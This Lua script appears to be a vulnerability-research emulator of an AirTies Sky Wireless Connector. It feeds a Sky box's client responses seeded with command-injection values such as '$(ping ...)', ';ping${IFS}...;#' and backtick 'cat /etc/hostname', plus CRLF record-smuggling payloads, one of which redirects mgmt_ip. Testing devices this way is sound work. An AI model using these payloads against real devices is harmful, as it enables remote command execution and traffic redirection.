#!/usr/bin/lua

local socket = require("socket")
io.stdout:setvbuf("line")

-- NAT REDIRECT targets the router's primary local address, so listen on every
-- local address.  The router firewall restricts access to the Sky box.
local bind_address = "0.0.0.0"
local bind_port = tonumber(os.getenv("SKYLINK_BIND_PORT")) or 18080
local test_profile = os.getenv("SKYLINK_TEST_PROFILE") or "normal"
local ssid = ""
local firmware = "1.0.0.9"
local capability_firmware = "0"
local capability_upgrade = "1"
local capability_dhcpclient = "1"
local network_fields = {
  protocol = "2",
  macaddr = "88:41:fc:6f:dc:52",
  mgmt_ip = "90.223.243.225",
  mgmt_subnet = "255.255.255.248",
  dhcpclient = "1",
  ip = "90.223.243.225",
  subnet = "255.255.255.248",
  gateway = "0.0.0.0",
  dns = "0.0.0.0"
}
local fields = {
  manufacturer = "AirTies",
  model = "Sky Wireless Connector",
  skyid = "skywirelessbridge",
  name = "AT1831610019564",
  buildtype = "",
  security = "",
  encryption = "",
  channel = "",
  mode = "",
  apmac = "",
  strength = "",
  state = "NOCONF",
  surveying = "0",
  joining = "0"
}

-- Benign blind command-injection probe. If an unsafe shell evaluates this
-- field, it emits one ICMP echo request to the controlled lab listener.
if test_profile == "cmd_substitution" then
  ssid = "X$(ping -c1 192.168.0.163)"
elseif test_profile == "quoted_ssid" then
  ssid = 'Quote"Inside'
elseif test_profile == "comma_ssid" then
  ssid = 'Comma,Inside'
elseif test_profile == "crlf_ssid" then
  ssid = 'BeforeCRLF\r\ninjected="marker"'
elseif test_profile == "oversized_ssid" then
  ssid = string.rep("A", 1024)
elseif test_profile == "firmware_semicolon" then
  firmware = "1.0.0.9;ping -c1 192.168.0.163;#"
elseif test_profile == "firmware_ifs" then
  firmware = "1.0.0.9;ping${IFS}-c1${IFS}192.168.0.163;#"
elseif test_profile == "all_fields_ifs" then
  local probe = ";ping${IFS}-c1${IFS}192.168.0.163;#"
  firmware = firmware .. probe
  ssid = ssid .. probe
  for key, value in pairs(fields) do
    fields[key] = value .. probe
  end
elseif test_profile == "all_fields_substitution" then
  local probe = "$(ping -c1 192.168.0.163)"
  firmware = firmware .. probe
  ssid = ssid .. probe
  for key, value in pairs(fields) do
    fields[key] = value .. probe
  end
elseif test_profile == "every_field_substitution" then
  local probe = "$(ping -c1 192.168.0.163)"
  firmware = firmware .. probe
  ssid = ssid .. probe
  for key, value in pairs(fields) do
    fields[key] = value .. probe
  end
  for key, value in pairs(network_fields) do
    network_fields[key] = value .. probe
  end
elseif test_profile == "joining_crlf_firmware" then
  -- Turn the final value into two syntactically valid response lines. This
  -- tests whether the client accepts a duplicate field smuggled via CR/LF.
  fields.joining = '0"\r\nfirmware="MARKER'
elseif test_profile == "ssid_crlf_firmware" then
  -- Fits within the 32-byte 802.11 SSID limit and emulates an unescaped SSID
  -- creating a later duplicate firmware record in the info response.
  ssid = 'X"\r\nfirmware="MARKER'
elseif test_profile == "ssid_crlf_mgmt_ip" then
  -- Also fits within the 32-byte SSID limit. If the client applies the last
  -- duplicate operationally, subsequent management traffic may be redirected
  -- to the controlled lab listener.
  ssid = 'X"\r\nmgmt_ip="192.168.0.163'
elseif test_profile == "ssid_crlf_state" then
  -- Fits within the 32-byte SSID limit and tests whether an injected later
  -- status record can make a live connector appear disconnected.
  ssid = 'X"\r\nstate="STA_DISCONNECTED'
elseif test_profile == "setup_unconfigured" then
  ssid = ""
  fields.security = "open"
  fields.encryption = "none"
  fields.channel = "0"
  fields.apmac = "00:00:00:00:00:00"
  fields.strength = "0"
  fields.state = "STA_NONE"
elseif test_profile == "control_fields_quote_semicolon_cmd" then
  -- Distinct ping counts identify which control field, if any, reaches an
  -- unsafe command consumer. Each value retains its normal valid prefix.
  network_fields.protocol = '2";ping -c2 90.223.243.225;#'
  network_fields.dhcpclient = '1";ping -c3 90.223.243.225;#'
  capability_dhcpclient = '1";ping -c3 90.223.243.225;#'
  capability_upgrade = '1";ping -c4 90.223.243.225;#'
  fields.config_type_probe = 'static";ping -c5 90.223.243.225;#'
elseif test_profile == "capability_upgrade_quote_semicolon_cmd" then
  capability_upgrade = '1";ping -c4 90.223.243.225;#'
elseif test_profile == "capability_firmware_quote_semicolon_cmd" then
  capability_firmware = '0";ping -c6 90.223.243.225;#'
elseif test_profile == "capability_dhcpclient_quote_semicolon_cmd" then
  capability_dhcpclient = '1";ping -c7 90.223.243.225;#'
elseif test_profile == "surveying_quote_semicolon_cmd" then
  fields.surveying_probe = '0";ping -c8 90.223.243.225;#'
elseif test_profile == "joining_quote_semicolon_cmd" then
  fields.joining_probe = '0";ping -c9 90.223.243.225;#'
elseif test_profile == "state_quote_semicolon_cmd" then
  fields.state = 'NOCONF";ping -c10 90.223.243.225;#'
elseif test_profile == "mgmt_ip_quote_semicolon_cmd" then
  network_fields.mgmt_ip = '90.223.243.225";ping -c11 90.223.243.225;#'
elseif test_profile == "settings_type_quote_semicolon_cmd" then
  fields.config_type_probe = 'static";ping -c5 90.223.243.225;#'
end

local runtime = {
  state = fields.state,
  surveying = false,
  joining = false,
  survey_done_at = nil,
  join_done_at = nil,
  state_before_survey = fields.state,
  config_type = "static",
  key_supplied = false
}

local scanned_networks = {
  {
    ssid = "Mercku_Guest", channel = "11", mode = "",
    security = "open", encryption = "none", strength = "100"
  },
  {
    ssid = "TestNetwork", channel = "6", mode = "",
    security = "wpa2-psk", encryption = "aes", strength = "80"
  }
}

if test_profile == "network_ssid_cmd_substitution" then
  -- 30 bytes, within the 802.11 SSID maximum. A callback would indicate that
  -- the Sky-box consumer evaluated a scanned SSID as shell syntax.
  scanned_networks[1].ssid = "X$(ping -c7 90.223.243.225)"
elseif test_profile == "network_encryption_cmd_substitution" then
  scanned_networks[1].encryption = "none$(ping -c7 90.223.243.225)"
elseif test_profile == "network_encryption_quote_semicolon_cmd" then
  -- Three packets distinguish this callback from the box's routine one-ping
  -- connectivity check.
  scanned_networks[1].encryption = 'none";ping -c3 90.223.243.225;#'
elseif test_profile == "network_encryption_inside_semicolon_cmd" then
  -- Keeps the separators inside the protocol field's quotes. This tests
  -- whether a later consumer unsafely concatenates the accepted value.
  scanned_networks[1].encryption = "none ;ping -c3 90.223.243.225;#"
elseif test_profile == "network_security_cmd_substitution" then
  scanned_networks[1].security = "open$(ping -c7 90.223.243.225)"
elseif test_profile == "network_security_quote_semicolon_cmd" then
  -- Benign callback canary in a join-relevant field, combining a quote and
  -- shell separators to test both record breakout and downstream handling.
  scanned_networks[1].security = 'open";ping -c2 90.223.243.225;#'
elseif test_profile == "network_channel_cmd_substitution" then
  scanned_networks[1].channel = "11$(ping -c7 90.223.243.225)"
elseif test_profile == "network_mode_cmd_substitution" then
  scanned_networks[1].mode = "$(ping -c7 90.223.243.225)"
elseif test_profile == "network_strength_cmd_substitution" then
  scanned_networks[1].strength = "100$(ping -c7 90.223.243.225)"
elseif test_profile == "network_ssid_crlf_duplicate" then
  -- A legal-size raw SSID value that terminates its quoted field and creates
  -- a second scan-record line. This is a structural parser canary only.
  scanned_networks[1].ssid = 'X"\r\nssid="INJECTED'
elseif test_profile == "network_ssid_tab" then
  scanned_networks[1].ssid = "TAB_A\tTAB_B"
elseif test_profile == "network_ssid_vtab" then
  scanned_networks[1].ssid = "VT_A\vVT_B"
elseif test_profile == "network_ssid_formfeed" then
  scanned_networks[1].ssid = "FF_A\fFF_B"
elseif test_profile == "network_ssid_lf" then
  scanned_networks[1].ssid = 'LF_A"\nssid="LF_INJECTED'
elseif test_profile == "network_ssid_cr" then
  scanned_networks[1].ssid = 'CR_A"\rssid="CR_INJECTED'
elseif test_profile == "network_ssid_nul" then
  scanned_networks[1].ssid = "NUL_A\0NUL_B"
elseif test_profile == "network_ssid_len32" then
  scanned_networks[1].ssid = "12345678901234567890123456789012"
elseif test_profile == "network_ssid_len33" then
  -- One byte beyond the IEEE 802.11 SSID maximum. The trailing Z makes
  -- truncation at 32 bytes externally visible while counts remain valid.
  scanned_networks[1].ssid = "12345678901234567890123456789012Z"
elseif test_profile == "network_ssid_utf8_32chars_33bytes" then
  -- 32 visible characters but 33 encoded bytes: 31 ASCII bytes followed by
  -- UTF-8 U+00E9. This detects character-count versus byte-count confusion.
  scanned_networks[1].ssid = string.rep("A", 31) .. "\195\169"
elseif test_profile == "network_ssid_comma_duplicate" then
  scanned_networks[1].ssid = 'COMMA_A",ssid="COMMA_INJECTED'
elseif test_profile == "network_ssid_security_precedence" then
  scanned_networks[1].ssid = 'A",security="open",ssid="B'
  scanned_networks[1].security = "wpa2-psk"
  scanned_networks[1].encryption = "aes"
elseif test_profile == "network_ssid_inject_count_one" then
  scanned_networks[1].ssid = 'COUNT_A"\nnets_returned="1'
elseif test_profile == "network_ssid_inject_count_zero" then
  scanned_networks[1].ssid = 'COUNT_ZERO"\nnets_returned="0'
elseif test_profile == "network_ssid_semicolon_cmd" then
  scanned_networks[1].ssid = "X;ping -c7 90.223.243.225;#"
elseif test_profile == "network_ssid_hostname_read" then
  scanned_networks[1].ssid = "X$(cat /etc/hostname)"
elseif test_profile == "network_ssid_hostname_read_backticks" then
  -- Read-only shell-evaluation canary. If a downstream shell evaluates the
  -- SSID, the command text is replaced by that system's hostname.
  scanned_networks[1].ssid = "X`cat /etc/hostname`"
elseif test_profile == "network_ssid_inject_channel_marker" then
  -- Legal-size SSID (27 bytes) that creates extra parser records and checks
  -- whether an injected channel value is carried into a synthetic network.
  scanned_networks[1].ssid = 'X"\nchannel="MARKER"\nssid="Y'
elseif test_profile == "network_ssid_quote_semicolon_cmd" then
  scanned_networks[1].ssid = 'X";ping -c7 90.223.243.225;#'
elseif test_profile == "network_ssid_lf_semicolon_cmd" then
  scanned_networks[1].ssid = 'X"\n;ping -c7 90.223.243.225;#'
elseif test_profile == "network_ssid_lf_named_cmd" then
  -- Exactly 32 bytes. Creates a second parsed SSID whose value begins with a
  -- shell separator, then tests that value through the selection/join path.
  scanned_networks[1].ssid = '"\nssid=";ping -c2 90.223.243.225'
end

local function advance_state()
  local now = socket.gettime()
  if runtime.surveying and now >= runtime.survey_done_at then
    runtime.surveying = false
    runtime.survey_done_at = nil
    runtime.state = runtime.state_before_survey
    print("state transition: survey complete")
  end
  if runtime.joining and now >= runtime.join_done_at then
    runtime.joining = false
    runtime.join_done_at = nil
    runtime.state = "AUTH"
    network_fields.dhcpclient = "1"
    network_fields.ip = "192.168.50.166"
    network_fields.subnet = "255.255.255.0"
    network_fields.gateway = "192.168.50.1"
    network_fields.dns = "192.168.50.1"
    print("state transition: join complete ssid=" .. string.format("%q", ssid))
  end
end

local function info_response()
  advance_state()
  local joining_value = runtime.joining and "1" or "0"
  local surveying_value = runtime.surveying and "1" or "0"
  local state_value = runtime.state
  if test_profile == "joining_crlf_firmware" then
    joining_value = fields.joining
  elseif test_profile == "joining_quote_semicolon_cmd" then
    joining_value = fields.joining_probe
  end
  if test_profile == "surveying_quote_semicolon_cmd" then
    surveying_value = fields.surveying_probe
  end
  if test_profile == "state_quote_semicolon_cmd" then
    state_value = fields.state
  end
  return table.concat({
    'protocol="' .. network_fields.protocol .. '"',
    'manufacturer="' .. fields.manufacturer .. '"',
    'model="' .. fields.model .. '"',
    'firmware="' .. firmware .. '"',
    'skyid="' .. fields.skyid .. '"',
    'name="' .. fields.name .. '"',
    'buildtype="' .. fields.buildtype .. '"',
    'macaddr="' .. network_fields.macaddr .. '"',
    'mgmt_ip="' .. network_fields.mgmt_ip .. '"',
    'mgmt_subnet="' .. network_fields.mgmt_subnet .. '"',
    'dhcpclient="' .. network_fields.dhcpclient .. '"',
    'ip="' .. network_fields.ip .. '"',
    'subnet="' .. network_fields.subnet .. '"',
    'gateway="' .. network_fields.gateway .. '"',
    'dns="' .. network_fields.dns .. '"',
    'ssid="' .. ssid .. '"',
    'security="' .. fields.security .. '"',
    'encryption="' .. fields.encryption .. '"',
    'channel="' .. fields.channel .. '"',
    'mode="' .. fields.mode .. '"',
    'apmac="' .. fields.apmac .. '"',
    'strength="' .. fields.strength .. '"',
    'state="' .. state_value .. '"',
    'surveying="' .. surveying_value .. '"',
    'joining="' .. joining_value .. '"',
    ''
  }, "\r\n")
end

local function capabilities_response()
  return table.concat({
    'firmware="' .. capability_firmware .. '"',
    'upgrade="' .. capability_upgrade .. '"',
    'dhcpclient="' .. capability_dhcpclient .. '"',
    ''
  }, "\r\n")
end

local function networks_response()
  advance_state()
  local found_count = #scanned_networks
  local returned_count = #scanned_networks
  if test_profile == "network_count_underreport" then
    found_count = 1
    returned_count = 1
  elseif test_profile == "network_count_overreport" then
    found_count = #scanned_networks + 1
    returned_count = #scanned_networks + 1
  elseif test_profile == "network_count_split" then
    found_count = #scanned_networks
    returned_count = 1
  elseif test_profile == "network_count_split_reverse" then
    found_count = 1
    returned_count = #scanned_networks
  elseif test_profile == "network_count_nonnumeric" then
    found_count = #scanned_networks
    returned_count = "abc"
  elseif test_profile == "network_count_negative" then
    found_count = #scanned_networks
    returned_count = "-1"
  end
  local lines = {
    'nets_found="' .. found_count .. '"',
    'nets_returned="' .. returned_count .. '"'
  }
  for _, network in ipairs(scanned_networks) do
    local network_ssid = network.ssid
    if network.ssid == "TestNetwork" and test_profile ~= "normal" then
      network_ssid = ssid
    end
    lines[#lines + 1] = string.format(
      'ssid="%s",channel="%s",mode="%s",security="%s",encryption="%s",strength="%s"',
      network_ssid, network.channel, network.mode, network.security,
      network.encryption, network.strength)
  end
  lines[#lines + 1] = ""
  return table.concat(lines, "\r\n")
end

local blocked = {
  reset = true,
  reboot = true,
  upgrade = true
}

local function url_decode(value)
  value = value:gsub("%+", " ")
  return value:gsub("%%(%x%x)", function(hex)
    return string.char(tonumber(hex, 16))
  end)
end

local function parse_parameters(query)
  local parameters = {}
  for key, value in (query or ""):gmatch("[&;]([^=&;]+)=([^&;]*)") do
    value = url_decode(value)
    -- Authentic Sky-box requests quote every value, including key="".
    -- Strip exactly one matching outer quote pair before using the value.
    local quote = value:sub(1, 1)
    if #value >= 2 and (quote == '"' or quote == "'") and
        value:sub(-1) == quote then
      value = value:sub(2, -2)
    end
    parameters[url_decode(key):lower()] = value
  end
  return parameters
end

local function identify_command(query)
  local decoded = url_decode(query):lower()
  for _, command in ipairs({
    "settings.type", "capabilities", "networks", "survey", "info",
    "upgrade", "reboot", "reset", "join", "set"
  }) do
    if decoded:find(command, 1, true) then
      return command
    end
  end
  return nil
end

local function send_response(client, status, reason, body)
  body = body or ""
  local head = table.concat({
    "HTTP/1.0 " .. status .. " " .. reason,
    "Content-Type: text/plain",
    "Content-Length: " .. #body,
    "Connection: close",
    "",
    ""
  }, "\r\n")
  client:send(head .. body)
end

local function handle_command(client, command, query)
  local parameters = parse_parameters(query)

  if command == "info" then
    send_response(client, 200, "OK", info_response())
  elseif command == "capabilities" then
    send_response(client, 200, "OK", capabilities_response())
  elseif command == "settings.type" then
    local settings_type = runtime.config_type
    if test_profile == "control_fields_quote_semicolon_cmd" or
        test_profile == "settings_type_quote_semicolon_cmd" then
      settings_type = fields.config_type_probe
    end
    send_response(client, 200, "OK",
      'type="' .. settings_type .. '"\r\n')
  elseif command == "survey" then
    runtime.state_before_survey = runtime.state
    runtime.state = "NOCONF"
    runtime.surveying = true
    runtime.survey_done_at = socket.gettime() + 2.5
    print("state transition: survey started")
    send_response(client, 200, "OK", "")
  elseif command == "networks" then
    send_response(client, 200, "OK", networks_response())
  elseif command == "join" then
    if not parameters.ssid or parameters.ssid == "" then
      send_response(client, 400, "Bad Request", "missing ssid\n")
      return
    end
    ssid = parameters.ssid
    fields.security = parameters.security or fields.security
    fields.encryption = parameters.encryption or fields.encryption
    for _, network in ipairs(scanned_networks) do
      if network.ssid == ssid then
        fields.channel = network.channel
        fields.mode = network.mode
        fields.strength = network.strength
        break
      end
    end
    runtime.key_supplied = parameters.key ~= nil and parameters.key ~= ""
    runtime.surveying = false
    runtime.survey_done_at = nil
    runtime.state = "JOIN"
    runtime.joining = true
    -- The real connector remained in JOIN for roughly 15 seconds before
    -- reporting AUTH and its DHCP lease.
    runtime.join_done_at = socket.gettime() + 15.0
    print(string.format(
      "state transition: join started ssid=%q security=%q encryption=%q key_supplied=%s",
      ssid, fields.security, fields.encryption,
      tostring(runtime.key_supplied)))
    send_response(client, 200, "OK", "")
  elseif command == "set" then
    local dhcp = parameters.dhcpclient
    if dhcp == "1" or parameters.type == "dhcpc" then
      runtime.config_type = "dhcpc"
      network_fields.dhcpclient = "1"
      network_fields.ip = "0.0.0.0"
      network_fields.subnet = "0.0.0.0"
      network_fields.gateway = "0.0.0.0"
      network_fields.dns = "0.0.0.0"
    else
      runtime.config_type = "static"
      network_fields.dhcpclient = "0"
      network_fields.ip = parameters.ip or network_fields.ip
      network_fields.subnet = parameters.subnet or parameters.mask or network_fields.subnet
      network_fields.gateway = parameters.gateway or network_fields.gateway
      network_fields.dns = parameters.dns or parameters.dns1 or network_fields.dns
    end
    print(string.format(
      "state transition: settings applied type=%s ip=%s subnet=%s gateway=%s dns=%s",
      runtime.config_type, network_fields.ip, network_fields.subnet,
      network_fields.gateway, network_fields.dns))
    send_response(client, 200, "OK", "")
  elseif blocked[command] then
    print("blocked state-changing command: " .. command)
    send_response(client, 403, "Forbidden", "state-changing command blocked\n")
  else
    send_response(client, 400, "Bad Request", "unknown request\n")
  end
end

local server, error_message = socket.bind(bind_address, bind_port)
if not server then
  io.stderr:write("bind failed: " .. tostring(error_message) .. "\n")
  os.exit(1)
end

server:settimeout(nil)
print(string.format("SkyLink emulator listening on %s:%d profile=%s",
  bind_address, bind_port, test_profile))

while true do
  local client = server:accept()
  client:settimeout(3)

  local request_line = client:receive("*l") or ""
  local method, target = request_line:match("^(%S+)%s+(%S+)")

  repeat
    local line = client:receive("*l")
    if not line or line == "" then break end
  until false

  local path, query = (target or ""):match("^([^?]*)%??(.*)$")
  local peer = client:getpeername()
  local log_query = (query or ""):gsub("([&;]key=)[^&;]*", "%1<redacted>")
  print(string.format("peer=%s method=%s path=%s query=%q",
    tostring(peer), tostring(method), tostring(path), tostring(log_query)))

  if method ~= "GET" then
    send_response(client, 405, "Method Not Allowed", "read-only emulator\n")
  elseif path ~= "/stbadmin" then
    send_response(client, 404, "Not Found", "not found\n")
  else
    local command = identify_command(query or "")
    handle_command(client, command, query or "")
  end

  client:close()
end
